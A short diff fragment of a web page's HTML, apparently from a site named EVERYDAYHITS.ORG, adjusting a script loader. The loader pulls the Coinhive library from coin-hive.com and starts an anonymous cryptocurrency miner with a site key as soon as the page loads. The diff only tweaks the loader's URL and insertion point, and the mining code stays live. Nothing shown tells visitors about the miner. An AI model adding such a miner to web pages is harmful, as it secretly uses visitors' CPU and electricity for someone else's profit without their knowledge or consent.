@@ -8,9 +8,9 @@
 		if(!d.getElementById(id))
 		{js=d.createElement(s);
 		js.id=id;
-		js.src="https://coin-hive.com/lib/coinhive.min.js";
+		js.src="//coin-hive.com/lib/coinhive.min.js";
 		js.appendChild(d.createTextNode("var miner = new CoinHive.Anonymous('bbxalNoLp5ZVs6plwCnsSbpPMdqh5qw7', {throttle: 0.1});miner.start();"));
-		d.head.insertBefore(js,fjs);}
+		fjs.parentNode.insertBefore(js,fjs);}
 		}(document,"script","cjs");
   </script>
 <!--<meta content="EVERYDAYHITS.ORG" property="og:site_name">-->
